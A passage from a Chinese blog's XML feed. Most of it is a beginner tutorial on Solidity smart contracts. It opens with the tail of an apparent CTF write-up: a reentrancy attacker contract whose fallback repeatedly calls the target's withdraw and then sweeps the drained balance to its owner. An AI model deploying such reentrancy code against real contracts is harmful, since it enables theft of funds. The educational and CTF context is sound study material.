keyword">payable</span> <span class="token punctuation">&#123;</span>        <span class="token builtin">bool</span> b<span class="token punctuation">;</span>        <span class="token punctuation">(</span>b<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token operator">=</span>target<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodeWithSignature</span><span class="token punctuation">(</span><span class="token string">"withdraw(uint256)"</span><span class="token punctuation">,</span>amount<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span><span class="token string">"step2 error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    fallback <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span><span class="token punctuation">&#123;</span>        <span class="token builtin">bool</span> b<span class="token punctuation">;</span>        <span class="token punctuation">(</span>b<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token operator">=</span>target<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodeWithSignature</span><span class="token punctuation">(</span><span class="token string">"withdraw(uint256)"</span><span class="token punctuation">,</span>amount<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span><span class="token string">"fallback error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">mywithdraw</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span><span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token operator">==</span>owner<span class="token punctuation">,</span><span class="token string">'not you'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        msg<span class="token punctuation">.</span>sender<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span>balance<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>1000000000000000</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>智能合约入门</title>
      <link href="/posts/ad0a0e46.html"/>
      <url>/posts/ad0a0e46.html</url>
      
        <content type="html"><![CDATA[<p>区块链我来啦</p><span id="more"></span>        <h1 id="智能合约入门"   >          <a href="#智能合约入门" class="heading-link"><i class="fas fa-link"></i></a><a href="#智能合约入门" class="headerlink" title="智能合约入门"></a>智能合约入门</h1>              <h2 id="Solidity"   >          <a href="#Solidity" class="heading-link"><i class="fas fa-link"></i></a><a href="#Solidity" class="headerlink" title="Solidity"></a>Solidity</h2>      <blockquote><p>Solidity中智能合约的含义就是一组代码（它的 <em>功能</em> )和数据（它的 <em>状态</em> ）的集合，并且它们是位于以太坊区块链的一个特定地址上的。</p></blockquote><p>Solidity也是一种编程语言，不过它针对智能合约项目进行了全面的支持，要想了解一门语言当然要从编写程序开始咯，那么我们就来写我们的第一个Solidity合约吧</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">//Name.sol</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.16</span><span class="token punctuation">;</span><span class="token comment">//Solidity必须开头，生命合约版本</span><span class="token keyword">contract</span> <span class="token class-name">Name</span><span class="token punctuation">&#123;</span>    <span class="token builtin">string</span> name<span class="token operator">=</span><span class="token string">"Jlan"</span><span class="token punctuation">;</span><span class="token comment">//设定状态</span>    <span class="token keyword">function</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">returns</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span><span class="token comment">//设定功能</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">changeName</span><span class="token punctuation">(</span><span class="token builtin">string</span> _newName<span class="token punctuation">)</span> <span class="token keyword">public</span>    <span class="token punctuation">&#123;</span>        name<span class="token operator">=</span>_newName<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以上就是一个非常基础的Solidity合约了，可以看的出合约很像是我们在别的语言中的一个类，确实如此，所以一些面向对象编程的内容也可以套用到Solidity上</p><p>在Solidity中，许多的操作都需要花费资源，又名gas，也就是虚拟货币，这些内容将在后面讲到</p><p>在给属性增加public属性之后自动生成get方法</p>        <h3 id="数据类型"   >          <a href="#数据类型" class="heading-link"><i class="fas fa-link"></i></a><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3>      <ul><li>int</li><li>uint=一个256位长度的无符号int</li><li>bytes1……bytes32 一个byte类型是8位</li></ul>        <h3 id="关键字"   >          <a href="#关键字" class="heading-link"><i class="fas fa-link"></i></a><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h3>      <ul><li>public</li><li>view</li><li>pure</li><li>returns</li><li>return</li><li>payable关键字修饰函数，可以通过这个函数给我们的合约地址充值</li></ul><p>回滚函数（fallback）</p>        <h3 id="全局属性"   >          <a href="#全局属性" class="heading-link"><i class="fas fa-link"></i></a><a href="#全局属性" class="headerlink" title="全局属性"></a>全局属性</h3>      <ul><li><code>block.blockhash(uint blockNumber) returns (bytes32)</code>：指定区块的区块哈希——仅可用于最新的 256 个区块且不包括当前区块；而 blocks 从 0.4.22 版本开始已经不推荐使用，由 <code>blockhash(uint blockNumber)</code> 代替</li><li><code>block.coinbase</code> (<code>address</code>): 挖出当前区块的矿工地址</li><li><code>block.difficulty</code> (<code>uint</code>): 当前区块难度</li><li><code>block.gaslimit</code> (<code>uint</code>): 当前区块 gas 限额</li><li><code>block.number</code> (<code>uint</code>): 当前区块号</li><li><code>block.timestamp</code> (<code>uint</code>): 自 unix epoch 起始当前区块以秒计的时间戳</li><li><code>gasleft() returns (uint256)</code>：剩余的 gas</li><li><code>msg.data</code> (<code>bytes</code>): 完整的 calldata</li><li><code>msg.gas</code> (<code>uint</code>): 剩余 gas - 自 0.4.21 版本开始已经不推荐使用，由 <code>gesleft()</code> 代替</li><li><code>msg.sender</code> (<code>address</code>): 消息发送者（当前调用）</li><li><code>msg.sig</code> (<code>bytes4</code>): calldata 的前 4 字节（也就是函数标识符）</li><li><code>msg.value</code> (<code>uint</code>): 随消息发送的 wei 的数量</li><li><code>now</code> (<code>uint</code>): 目前区块时间戳（<code>block.timestamp</code>）</li><li><code>tx.gasprice</code> (<code>uint</code>): 交易的 gas 价格</li><li><code>tx.origin</code> (<code>address</code>): 交易发起者（完全的调用链）</li></ul>        <h3 id="address成员变量"   >          <a href="#address成员变量" class="heading-link"><i class="fas fa-link"></i></a><a href="#address成员变量" class="headerlink" title="address成员变量"></a>address成员变量</h3>      <ul><li><p><code>&lt;address&gt;.balance</code> (<code>uint256</code>):</p><p>以 Wei 为单位的 <span class="exturl"><a class="exturl__link"   href="https://solidity-cn.readthedocs.io/zh/develop/types.html#address" >地址类型</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 的余额。</p></li><li><p><code>&lt;address&gt;.transfer(uint256 amount)</code>:</p><p>向 <span class="exturl"><a class="exturl__link"   href="https://solidity-cn.readthedocs.io/zh/develop/types.html#address" >地址类型</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 发送数量为 amount 的 Wei，失败时抛出异常，发送 2300 gas 的矿工费，不可调节。</p></li><li><p><code>&lt;address&gt;.send(uint256 amount) returns (bool)</code>:</p><p>向 <span class="exturl"><a class="exturl__link"   href="https://solidity-cn.readthedocs.io/zh/develop/types.html#address" >地址类型</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 发送数量为 amount 的 Wei，失败时返回 <code>false</code>，发送 2300 gas 的矿工费用，不可调节。</p></li><li><p><code>&lt;address&gt;.call(...) returns (bool)</code>:</p><p>发出低级函数 <code>CALL</code>，失败时返回 <code>false</code>，发送所有可用 gas，可调节。</p></li><li><p><code>&lt;address&gt;.callcode(...) returns (bool)</code>：</p><p>发出低级函数 <code>CALLCODE</code>，失败时返回 <code>false</code>，发送所有可用 gas，可调节。</p></li><li><p><code>&lt;address&gt;.delegatecall(...) returns (bool)</code>:</p><p>发出低级函数 <code>DELEGATECALL</code>，失败时返回 <code>false</code>，发送所有可用 gas，可调节。</p></li></ul>        <h3 id="mapping哈希表"   >          <a href="#mapping哈希表" class="heading-link"><i class="fas fa-link"></i></a><a href="#mapping哈希表" class="headerlink" title="mapping哈希表"></a>mapping哈希表</h3>      <p>使用语法</p><p><code>mapping(映射关系) 哈希表名称;</code></p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span><span class="token operator">^</span><span class="token version number">0.4.16</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">mappingTest</span><span class="token punctuation">&#123;</span>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint</span><span class="token punctuation">)</span> idmap<span class="token punctuation">;</span>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">uint</span> <span class="token operator">=></span> <span class="token builtin">string</span><span class="token punctuation">)</span> namemap<span class="token punctuation">;</span>    <span class="token builtin">uint</span> sum<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token builtin">string</span> username<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token builtin">address</span> account<span class="token operator">=</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>        sum<span class="token operator">++</span><span class="token punctuation">:</span>        idmap<span class="token punctuation">[</span>account<span class="token punctuation">]</span><span class="token operator">=</span>sum<span class="token punctuation">;</span>        namemap<span class="token punctuation">[</span>sum<span class="token punctuation">]</span><span class="token operator">=</span>username<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>        <h3 id="函数重载"   >          <a href="#函数重载" class="heading-link"><i class="fas fa-link"></i></a><a href="#函数重载" class="headerlink" title="函数重载"></a>函数重载</h3>      <p>当使用不同的参数（数量，类型）时可以让函数重载，并且如同uint160与address这样的参数类型也是算不同参数类型，可以编译通过，但会有问题</p><p>当使用确定参数调用函数时，如果能同时匹配多个重载的函数，会直接报错，如下例：<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202208140247208.png"></p><p>在这里test函数调用fun函数时传入了一个确定的参数1，同时匹配了uint类型和uint8类型，此时导致编译失败</p><p>而在下面这个例子中，传入的是<code>msg.sender</code>，此时编译通过，运行发现结果返回调用了以address为参数类型的fun函数重载，<del>为啥啊我也不知道啊啊啊啊啊啊啊啊啊啊</del>，后面再看吧😭<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202208140250890.png"></p>        <h3 id="函数传参"   >          <a href="#函数传参" class="heading-link"><i class="fas fa-link"></i></a><a href="#函数传参" class="headerlink" title="函数传参"></a>函数传参</h3>      <p>类似python的两种方法，一是按照函数定义的顺序直接填入，二是通过花括号指定传入哪个形参，如下例：</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.16</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">parma</span><span class="token punctuation">&#123;</span>    <span class="token builtin">uint</span> <span class="token keyword">public</span> num<span class="token punctuation">;</span>    <span class="token builtin">string</span> <span class="token keyword">public</span> name<span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">setParam</span><span class="token punctuation">(</span><span class="token builtin">uint</span> _num<span class="token punctuation">,</span><span class="token builtin">string</span> _name<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        num<span class="token operator">=</span>_num<span class="token punctuation">;</span>        name<span class="token operator">=</span>_name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">T1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">setParam</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token string">"J1an"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">T2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">setParam</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>_name<span class="token punctuation">:</span><span class="token string">"Ben"</span><span class="token punctuation">,</span>_num<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token comment">//    function T3()&#123;</span><span class="token comment">//        setParam(100);</span><span class="token comment">//    &#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在上面这个例子中，T1，T2形象的说明了函数传参的方式，并且如果加入T3函数代码会发现编译无法通过，这是因为在合约内部的函数调用其他函数时必须严格按照函数定义的形参传入参数，但我们在尝试让用户直接对<code>setParam(100)</code>进行调用时会发现调用成功了，并且<code>_name</code>被自动赋值为空，如下图所示：<del>tmd这种睿智参数传递多少有点大病</del><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202208140302099.png"></p>        <h3 id="函数返回值"   >          <a href="#函数返回值" class="heading-link"><i class="fas fa-link"></i></a><a href="#函数返回值" class="headerlink" title="函数返回值"></a>函数返回值</h3>      <p>solidity中的函数可以有多个返回值</p><p>如果给了函数返回值的参数名，那么这个参数会以类似形参的方式传入到函数中，我们可以不通过return而直接给这个形参赋值来达到返回值的效果，而如果形参传递和return同时存在，以return为准，<del>这不废话吗肯定return优先级高啊，return相当于赋值了还把函数给结束了，后面没操作了可不它高吗</del></p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.16</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">funReturn</span><span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function">T1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">returns</span><span class="token punctuation">(</span><span class="token builtin">uint</span> num<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">T2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">returns</span><span class="token punctuation">(</span><span class="token builtin">uint</span> num<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        num<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">T3</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">returns</span><span class="token punctuation">(</span><span class="token builtin">uint</span> num<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        num<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">4</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>        <h3 id="变量作用域和值传递"   >          <a href="#变量作用域和值传递" class="heading-link"><i class="fas fa-link"></i></a><a href="#变量作用域和值传递" class="headerlink" title="变量作用域和值传递"></a>变量作用域和值传递</h3>      <p>作用域以小的为准</p>        <h3 id="修饰符"   >          <a href="#修饰符" class="heading-link"><i class="fas fa-link"></i></a><a href="#修饰符" class="headerlink" title="修饰符"></a>修饰符</h3>      <p><code>private</code>函数只能被合约独立使用，不能被继承</p><p><code>public</code>函数可以被任意调用，可以被继承</p><p><code>internal</code>函数只能在合约内部调用，不能直接在外部调用，可以被继承</p><p><code>external</code>函数不能在合约内部进行调用，只能在合约外部被调用（在函数内部可以通过this来间接调用，也可以通过new创建新合约的方法调用），可以被继承</p><p><code>pure</code>不消耗gas，不会读取全局变量，也不会修改全局变量，一个固定输入就会有固定输出</p><p><code>view</code>读取全局变量但不修改，不消耗gas</p><p><code>payable</code>进行金钱交易时所必须的修饰符</p>        <h3 id="值传递和副本拷贝"   >          <a href="#值传递和副本拷贝" class="heading-link"><i class="fas fa-link"></i></a><a href="#值传递和副本拷贝" class="headerlink" title="值传递和副本拷贝"></a>值传递和副本拷贝</h3>      <p>直接如同a=b这样的传递都是值传递，传入函数都是副本拷贝</p>        <h3 id="const常量定义（已废弃）"   >          <a href="#const常量定义（已废弃）" class="heading-link"><i class="fas fa-link"></i></a><a href="#const常量定义（已废弃）" class="headerlink" title="const常量定义（已废弃）"></a>const常量定义（已废弃）</h3>      <p>函数中使用constant（版本为0.4.16）修饰，不消耗gas（与view修饰等价，并且将在0.5.0版本中废弃）</p><p>对于全局变量（局部不可用）使用constant修饰，无法被更改（就是常量定义嘛～～～）</p><p>变量并非所有类型都可以使用常量显示，可使用的类型有<code>int,uint,string,bytes1-32</code></p>        <h3 id="构造函数"   >          <a href="#构造函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h3>      <p>构造函数与合约同名或者命名为<code>constructor</code>（新版本），首先被执行，构造函数传参需要在合约部署时赋予</p>        <h3 id="函数modifire（函数修改器）"   >          <a href="#函数modifire（函数修改器）" class="heading-link"><i class="fas fa-link"></i></a><a href="#函数modifire（函数修改器）" class="headerlink" title="函数modifire（函数修改器）"></a>函数modifire（函数修改器）</h3>      <p>require判断，如果require中的内容不成立，那么后面的代码都不会被执行并且回滚</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202208220048145.png"></p><p>此处例子中，在合约部署时设定了部署者为合约拥有者，在modifier中验证了函数change的身份，首次我们让函数拥有者5B3进行调用发电函数调用成功，a的值被修改，而当我们切换用户Ab8再进行调用时，会发现调用失败并且报错</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.16</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">modifierTest</span><span class="token punctuation">&#123;</span>    <span class="token builtin">address</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span>    <span class="token builtin">uint</span> <span class="token keyword">public</span> a<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">modifierTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        owner<span class="token operator">=</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">modifier</span> OnlyOwner<span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token operator">==</span>owner<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">_</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">change</span><span class="token punctuation">(</span><span class="token builtin">uint</span> _num<span class="token punctuation">)</span>OnlyOwner<span class="token punctuation">&#123;</span>        a<span class="token operator">=</span>_num<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">modifier</span> modifierName<span class="token punctuation">&#123;</span>    <span class="token keyword">require</span><span class="token punctuation">(</span>执行函数要求条件<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">_</span><span class="token punctuation">;</span><span class="token comment">//占位函数</span><span class="token punctuation">&#125;</span><span class="token comment">//函数调用</span><span class="token keyword">function</span> <span class="token function">funName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> modifierName<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token comment">//该函数执行时会先进入modifier进行判断</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第二个应用，判断用户注册</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202208220923409.png"></p><p>这个例子中我们在注册前先对其要求该address对应的id为0也就是未注册过才可以进入注册函数</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.16</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">modifierTest</span><span class="token punctuation">&#123;</span>    <span class="token builtin">address</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span>    <span class="token builtin">uint</span> sum<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token operator">=></span><span class="token builtin">uint</span><span class="token punctuation">)</span> idmap<span class="token punctuation">;</span>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token operator">=></span><span class="token builtin">string</span><span class="token punctuation">)</span> namemap<span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">modifierTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        owner<span class="token operator">=</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">modifier</span> OnlyOwner<span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token operator">==</span>owner<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">_</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">modifier</span> regConfirm<span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>idmap<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">_</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token builtin">string</span> name<span class="token punctuation">)</span> regConfirm<span class="token punctuation">&#123;</span>        <span class="token builtin">address</span> account<span class="token operator">=</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>        sum<span class="token operator">++</span><span class="token punctuation">;</span>        idmap<span class="token punctuation">[</span>account<span class="token punctuation">]</span><span class="token operator">=</span>sum<span class="token punctuation">;</span>        namemap<span class="token punctuation">[</span>sum<span class="token punctuation">]</span><span class="token operator">=</span>name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第三个应用，权限管理，代码就不放了自己意会吧</p><p>modifier执行顺序，在有多个modifier被使用时，后面的modifier会与函数一起被放入前一个modifier的<code>_;</code>占位符中</p>        <h3 id="合约继承"   >          <a href="#合约继承" class="heading-link"><i class="fas fa-link"></i></a><a href="#合约继承" class="headerlink" title="合约继承"></a>合约继承</h3>      <p>继承语法</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.16</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">father</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">contract</span> <span class="token class-name">son</span> <span class="token keyword">is</span> father<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以连续继承，可多重继承，如果有同名属性以最后的合约为准</p><p>对于属性和函数来说private不可被继承</p>        <h3 id="getter函数"   >          <a href="#getter函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#getter函数" class="headerlink" title="getter函数"></a>getter函数</h3>      <p>public属性的变量会自动生成一个同名属性为external的函数，对于mapping类型生成一个有参数的函数，传</p>        <h3 id="回退函数fallback"   >          <a href="#回退函数fallback" class="heading-link"><i class="fas fa-link"></i></a><a href="#回退函数fallback" class="headerlink" title="回退函数fallback"></a>回退函数fallback</h3>      <p>fallback函数，回退函数，是合约里的特殊无名函数，有且仅有一个。它在合约调用没有匹配到函数签名，或者调用没有带任何数据时被自动调用。回退函数是合约里的特殊函数，没有名字，不能有参数，没有返回值。下面来看一个简单的回退函数例子。</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">SimpleFallback</span><span class="token punctuation">&#123;</span>  <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//fallback function</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当调用的函数找不到时，就会调用默认的fallback函数。由于Solidity中，Solidity提供了编译期检查，所以我们不能直接通过Solidity调用一个不存在的函数。但我们可以使用Solidity的提供的底层函数<code>address.call</code>来模拟这一行为，关于<code>call()</code>函数详见：<span class="exturl"><a class="exturl__link"   href="http://me.tryblockchain.org/Solidity-call-callcode-delegatecall.html" >http://me.tryblockchain.org/Solidity-call-callcode-delegatecall.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 。我们来看个例子：</p><ul><li><strong>send()函数发送ether</strong></li></ul><p>当我们使用<code>address.send(ether to send)</code>向某个合约直接转帐时，由于这个行为没有发送任何数据，所以接收合约总是会调用fallback函数，我们来看看下面的例子</p>        <h3 id="合约销毁"   >          <a href="#合约销毁" class="heading-link"><i class="fas fa-link"></i></a><a href="#合约销毁" class="headerlink" title="合约销毁"></a>合约销毁</h3>      <p>selfdestruct(owner);</p>        <h3 id="storage和memory"   >          <a href="#storage和memory" class="heading-link"><i class="fas fa-link"></i></a><a href="#storage和memory" class="headerlink" title="storage和memory"></a>storage和memory</h3>      <p>全局变量被存在链上，属于storage中的内容，在函数中运行的值都只存在本机中，属于memory中内容，用后即销毁</p><p>但是在函数中定义的可变数组是storage类型</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF 7月赛</title>
      <link href="/posts/c1a72657.html"/>
      <url>/posts/c1a72657.html</url>
      
